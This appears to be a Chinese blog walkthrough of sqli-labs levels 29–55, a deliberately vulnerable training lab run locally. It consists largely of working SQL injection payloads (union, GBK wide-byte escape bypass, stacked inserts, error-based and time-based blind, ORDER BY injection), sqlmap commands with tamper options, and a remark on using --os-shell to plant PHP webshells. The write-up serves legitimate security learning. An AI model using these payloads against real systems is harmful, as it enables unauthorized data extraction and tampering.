<h2 id="构造一个比较长的字符串"><a href="#构造一个比较长的字符串" class="headerlink" title="构造一个比较长的字符串"></a>构造一个比较长的字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>);</span><br></pre></td></tr></table></figure>

<p>生成 id1 变量（用于白名单检查）时，限制了长度，本来是挺正常的，但 sql语句中用的不是 id1，而是 $_GET[‘id’]，就出问题了</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">11111111111111111111111111111111111111111111111111111111111</span><span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h2 id="前两个字符-“id”"><a href="#前两个字符-“id”" class="headerlink" title="前两个字符 == “id”"></a>前两个字符 == “id”</h2><p>生成 id1 变量时，只比较前两个字符，第三个字符可以不是等号</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ida123&amp;id=<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h1><p>同29，单引号换成双引号</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">65535</span>&amp;<span class="built_in">id</span>=<span class="string">&quot;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h1><p>同30，加个括号</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">65535</span>&amp;<span class="built_in">id</span>=<span class="string">&quot;)union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h1><p>宽字符/宽字节注入</p>
<p>好像要求字符集为 GBK，有没有其他要求不知道</p>
<p>猜一下原因，反斜杠 ASCII 码值为 5C（gbk、utf8这些变长编码都兼容ASCII码，所以反斜杠还是 5C），而非最高位的字节为 5C 在gbk中是存在合法的码的。像utf8，多字节的码每个字节的最高位都是 1（5c = 0101 1100），不存在合法的码。gb2312中好像也不行</p>
<p>这关转义了 <code>&#39; &quot; \</code> 就在这些字符前面加反斜杠。如果我们传入id参数时在 单引号 前面加上 <code>%df</code> ，别的值也行，但是要超过 ASCII 码表示的范围（0x00 - 0x7f，%80好像也不行，不行就多试几个），<code>\xdf&#39;</code> 转义后为<code>\xdf\x5c&#39;</code> 字符集为 GBK 时，0xdf 不在单字节字符（0x00 - 0x7f）的范围内，所以 0xdf 被 mysql 认为是 多字节字符（GBK好像最多就两字节表示一个字符）的第一个字节，而 0x5c 被认为是第二个字节而不是反斜杠，单引号就逃逸了。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=%df<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="number">0x7573657273</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>mysql中字符串可直接用十六进制的值来表示，如 ‘security’ 为 0x7365637572697479</p>
<p>至于sqlmap，有个tamper和宽字符注入相关，叫 unmagicquotes</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">32</span>/?id=<span class="number">1</span> --technique=U --tamper=unmagicquotes</span><br></pre></td></tr></table></figure>



<p>网上又说这样可以避免宽字符注入的，没试过</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">character_set_client</span>=binary</span><br></pre></td></tr></table></figure>

<p>看了一下源码，和之前比多了个这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br></pre></td></tr></table></figure>





<h1 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h1><p>同 32</p>
<p>代码中 32 使用正则表达式，33直接使用 addslashes</p>
<h1 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h1><p>get换成post</p>
<p>hackbar有点问题（还是说是我的问题），%df 说我 URI malformed，换burp suite</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=%df&#x27; union select 1,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=0x7365637572697479 <span class="keyword">and</span> <span class="attribute">table_name</span>=0x7573657273--+&amp;passwd=2&amp;submit=Submit</span><br></pre></td></tr></table></figure>



<h1 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h1><p>字符型换数字型</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="number">0x7573657273</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h1><p>同 32</p>
<p>addslashes换成了 mysql_real_escape_string</p>
<h1 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h1><p>同 34</p>
<p>也是 addslashes 换成了 mysql_real_escape_string</p>
<h1 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h1><p>堆叠注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)  <span class="comment">// 执行$sql中所有的sql语句</span></span><br></pre></td></tr></table></figure>

<p>用分号分隔 sql语句，相当于可以执行任意的 sql 语句</p>
<p>以下可以插入一条数据</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27;;insert into users(username,password) values (&#x27;</span><span class="keyword">stacked</span><span class="string">&#x27;, &#x27;</span>asd<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure>

<p>之前的方法也可以使用</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p>这样虽然之后还有一部分不完整的sql语句（执行到后面时会报错），但问题不大，我们的联合查询可以正常执行</p>
<p>堆叠注入可以配合 预处理（prepare） 来绕过某些过滤</p>
<h1 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h1><p>同 38 字符型变成整型</p>
<h1 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h1><p>index.php 没什么好关注的，就 38 加个括号好像</p>
<p>两个同名文件大写开头的那个 Logged-in.php 没什么东西，之前解压时刚好把大写的那个覆盖了</p>
<p>login.php 用get方法访问后直接重定向，再一看，怎么和 24 的那么像 啊</p>
<p>摆了，不知道是我的问题还是本来就这样</p>
<h1 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h1><p>和 39 比起来 少了报错信息</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>



<h1 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h1><p>登录时存在堆叠注入，password没有转义单引号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: 随便</span><br><span class="line"></span><br><span class="line">password: &#x27; or 1=1;<span class="keyword">insert</span> <span class="keyword">into</span> users(username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;stacked2&#x27;</span>,<span class="string">&#x27;asd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>可以插入一条新的数据，还可以顺便登录</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p>可以联合注入，2是回显点</p>
<h1 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h1><p>浏览器标题还是写着 Less-42，我还以为我电脑寄了</p>
<p>github上面的 issues 中有人提出来了</p>
<p>就加个括号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: &#x27;) or 1=1;<span class="keyword">insert</span> <span class="keyword">into</span> users(username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;stacked3&#x27;</span>,<span class="string">&#x27;asd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>要是在浏览器中不知道自己password有没有输错，可以把这个input 标签的 type 从 password 改成 text，在 F12 中修改，或者 右键 -&gt; 检查（谷歌浏览器是检查，其他浏览器可能叫法不一样）快速找到这个元素</p>
<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>一开始看和 42 一样，说是盲注结果还有回显点</p>
<p>vscode 左右拆分比较代码，发现这关没有报错信息</p>
<p>emm。。。</p>
<p>或许该去找一个比较代码差异的工具</p>
<h1 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h1><p>好像又是比 44 多了个括号</p>
<p>那摆了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">password</span>: &#x27;)union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>



<h1 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h1><p>拼接sql语句的位置在 order by 后面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>有本书把这种情况称为 注入点在 order by 后</p>
<p>但好像还有种说法是把 sort 参数称为注入点</p>
<p>感觉都挺有道理的？</p>
<p>sqlmap 好像比较赞同第二种说法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">if</span> the injection <span class="type">point</span> <span class="keyword">on</span> <span class="keyword">GET</span> parameter <span class="string">&#x27;sort&#x27;</span> <span class="keyword">is</span> a <span class="keyword">false</span> positive</span><br></pre></td></tr></table></figure>



<p>不管了，order by 后面能接什么东西不知道，可以自己用 mysql 试一试</p>
<p>试出来可以用报错注入</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=extractvalue(<span class="number">0x0a</span>,<span class="built_in">concat</span>(<span class="number">0x0a</span>,(<span class="built_in">select</span> database())))</span><br></pre></td></tr></table></figure>

<p>也可以用基于时间的盲注</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="built_in">SLEEP</span>(<span class="number">2</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h1 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h1><p>sort 参数的值被单引号包裹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>再用mysql 试一下</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>可以正常执行</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?s</span>ort=<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) and &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">?s</span>ort=<span class="string">&#x27; or if(1=1,SLEEP(2),1) and &#x27;</span></span><br></pre></td></tr></table></figure>

<p>时间盲注的时候，if 前面如果是 and 就不行，难道是什么奇怪的短路求值？</p>
<figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">不行奥 &#x27; and if(1</span>=<span class="string">1,SLEEP(2),1)</span></span><br></pre></td></tr></table></figure>

<p>order by 后面不接空字符串，用 and 又行了，可能真的是短路求值吧</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=123&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1,SLEEP(2),1)--+</span><br></pre></td></tr></table></figure>

<p>order by 后面接空字符串，无论 and 什么都为假，不执行 sleep 很合理</p>
<p>sqlmap 也可以发现注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">47</span>/?sort=<span class="number">1</span> --dbms=MySQL --technique=E</span><br></pre></td></tr></table></figure>

<p>帮他一把省点时间，不然时间盲注这个表每有一行 sleep(1) 就多一秒，现在有十几行，sleep(1) 都得等十几秒，不知道是我出了什么问题还是本来就这样</p>
<h1 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h1><p>报错信息没了，可以时间盲注</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=<span class="keyword">if</span>(<span class="number">1</span>,sleep(<span class="number">1</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>sqlmap</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">48</span>/?sort=<span class="number">1</span> --dbms=MySQL --technique=T -D security -T users --columns</span><br></pre></td></tr></table></figure>



<h1 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h1><p>好像就比 48 多两个单引号，就像 46 和 47 的差别</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">sort</span>=&#x27; or <span class="keyword">if</span>(1,<span class="keyword">sleep</span>(1),1)--+</span><br></pre></td></tr></table></figure>

<p>sqlmap也行</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">49</span>/?sort=<span class="number">1</span> --dbms=MySQL --technique=T --current-db</span><br></pre></td></tr></table></figure>



<p>顺便试了一下sqlmap的 –os-shell</p>
<p>用的时候sqlmap 会让你选择网站使用的语言（如PHP），和网站在服务器上的根目录</p>
<p>成功了之后可以在服务器上看到网站根目录多了两个php写的木马</p>
<p>退出之后就自动删除了</p>
<p>使用这个需要满足一些条件</p>
<p>mysql配置的 secure_file_priv （less-7），知道网站在服务器上的目录，以及要有相应权限（比如写文件到指定目录？网上说的）</p>
<h1 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h1><p>堆叠注入，但无回显，有报错</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=extractvalue(<span class="number">0x0a</span>,<span class="built_in">concat</span>(<span class="number">0x0a</span>,(<span class="built_in">select</span> database())));</span><br></pre></td></tr></table></figure>



<h1 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h1><p>比 50 多个单引号</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>&#x27; <span class="keyword">or</span> <span class="keyword">extractvalue</span>(<span class="number">0x0a</span><span class="punctuation">,</span>concat(<span class="number">0x0a</span><span class="punctuation">,</span>(<span class="keyword">select</span> database())))<span class="comment">;</span></span><br></pre></td></tr></table></figure>



<h1 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h1><p>报错信息删了</p>
<h1 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h1><p>多个单引号</p>
<h1 id="less-54-（challenge）"><a href="#less-54-（challenge）" class="headerlink" title="less-54 （challenge）"></a>less-54 （challenge）</h1><p>描述</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The objective <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> dump the (secret key) <span class="keyword">from</span> <span class="keyword">only</span> random <span class="keyword">table</span> <span class="keyword">from</span> <span class="keyword">Database</span> (<span class="string">&#x27;CHALLENGES&#x27;</span>) <span class="keyword">in</span> Less than <span class="number">10</span> attempts</span><br><span class="line"><span class="keyword">For</span> fun, <span class="keyword">with</span> every <span class="keyword">reset</span>, the challenge spawns random <span class="keyword">table</span> <span class="type">name</span>, <span class="keyword">column</span> <span class="type">name</span>, <span class="keyword">table</span> data. Keeping it fresh at <span class="keyword">all</span> times.</span><br></pre></td></tr></table></figure>

<p>大致意思是表名随机，而且查询一定次数会重新生成表名</p>
<p>只有表名会变，所以试列数回显点什么的多试几次也没什么问题，数据库名字也给了</p>
<p>sqlmap不知道会不会直接寄</p>
<p>测试是否存在注入（// 后面为注释，解释这一步的目的）</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>  //<span class="built_in"> id</span>=<span class="number">1</span>是存在的，如果不知<span class="built_in">道id</span>为何值时是存在的，可以试试可能存在的值或者直接尝试整型或字符型注入</span><br><span class="line"></span><br><span class="line">// 根<span class="built_in">据id</span>来查找数据（增删改查中的查）</span><br><span class="line">// 可以先假设一下sql语句，如 select * from a_table <span class="keyword">where</span><span class="built_in"> id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] limit <span class="number">0</span>,<span class="number">1</span>; 猜测一下程序把我们传进去的参数拼接在了什么位置（只是个大概，不一定准确）</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">2</span>  //<span class="built_in"> id</span>=<span class="number">2</span>也是存在的，也可以不要这一步，看<span class="built_in"> id</span>=<span class="number">2</span>-<span class="number">1</span> 结果和<span class="built_in"> id</span>=<span class="number">1</span> 相不相同</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">2</span>-<span class="number">1</span>  // 此时页面和<span class="built_in"> id</span>=<span class="number">2</span> 时相同，基于 mysql 中字符串和整型比较时的结果，我们可以知道 <span class="number">2</span>-<span class="number">1</span> 很大可能被作为字符串拼接在 sql 语句中（引号包裹），也不排除数据库<span class="built_in">里id</span>为字符型，刚好有一条记<span class="built_in">录id</span>是 <span class="string">&#x27;2-1&#x27;</span> ，可以多试几个</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=-<span class="number">1</span>  // 用于判断是否有mysql的报错信息，要结合后面的</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  // 判断单引号还是双引号包裹，页面没有显示信息，可能就是单引号包裹并且没有报错信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&quot;  // 与id=1页面相同，结合之前的，大概率是单引号包裹的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 以上只能初步判断，搞不好就有那种特别离谱的数据库，但都到这了，不妨接着试一试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>--+  // 有信息，之后可以用二分法判断查询了多少列，<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>没问题，<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>有问题，所以 <span class="number">3</span> 的时候sql语句正常，而 <span class="number">4</span> 不正常，所以只查询了 <span class="number">3</span> 列</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="string">&#x27;union select 1,2,3--+  // 知道了查询三列，就可以试试联合查询，注意 单引号前面的 1 不要了，不然如果网页只能回显一行，我们的1，2，3就显示不出来了。观察网页，我们发现有2，3这两个回显点，而且这时候我们能够确定真的存在sql注入</span></span><br></pre></td></tr></table></figure>

<p>注入点和回显点都确定了，数据库名也知道了，直接查有哪些表，列</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=&#x27;challenges&#x27;--+  <span class="comment">// 查表名</span></span><br><span class="line"></span><br><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=&#x27;challenges&#x27; <span class="built_in">and</span> table_name=&#x27;lc7tl44y41&#x27;--+  <span class="comment">// 查列名  id,sessid,secret_ZJSK,tryy</span></span><br><span class="line"></span><br><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat_ws(&#x27;^^&#x27;,id,sessid,secret_ZJSK,tryy) separator &#x27;/\\&#x27;),<span class="number">3</span> <span class="keyword">from</span> lc7tl44y41--+  <span class="comment">// 我们自己指定一下分隔符，不然默认都是逗号，group_concat 和 concat_ws 指定分隔符的方法有一点点不一样</span></span><br></pre></td></tr></table></figure>

<p>查出来只有一行 secret_ZJSK 这个字段应该就是他想要我们找的</p>
<h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">error </span>in function next_tryy()You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;7e8cvw0olr SET tryy=tryy<span class="string">+1</span> WHERE id=1&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>人麻了，最恐怖的是我试了一下 less-54 也这样了</p>
<p>可能是 7e8cvw0olr 和什么mysql中的关键字冲突了</p>
<p>修改一下sql-connections/functions.php，79行，next_tryy函数中</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;UPDATE $table SET tryy=tryy+1 WHERE id=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">=&gt;$sql = <span class="string">&quot;UPDATE `$table` SET tryy=tryy+1 WHERE id=1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在 $table 两端加上反引号，表示这只是一个用户定义的标识符</p>
<p>还有第87行，view_attempts函数中，改为</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">SELECT</span> tryy <span class="keyword">FROM</span> <span class="symbol">`$table`</span> <span class="keyword">WHERE</span> id=<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>也是加上反引号</p>
<p>正常了我超</p>
<p>寻找注入点</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">2</span><span class="number">-1</span>  <span class="comment">// 这次和 id=1 的页面相同，大概率是整型注入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> order by <span class="number">1</span>--+  <span class="comment">// 没反应，有可能是括号括起来了</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span>) order by <span class="number">1</span>--+  <span class="comment">// 可以了，还是二分法测试查询了多少列（仍是3列）</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span>) <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+  <span class="comment">// 空字符串换成 -1，一样的目的，为了让原本的查询查不出数据，-1不行就换成一些更离谱的值，或者加上 and 1=2，仍是2，3回显</span></span><br></pre></td></tr></table></figure>

<p>其实和 54 差不多，接下来就基本一样了</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><del>没显示值，可能是过滤了引号，使用16进制绕过</del></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x6368616c6c6<span class="number">56e676573</span></span><br></pre></td></tr></table></figure>

<p>我括号忘记加上了，没过滤引号。。。直接从 54 复制过来的，改一下比较快</p>
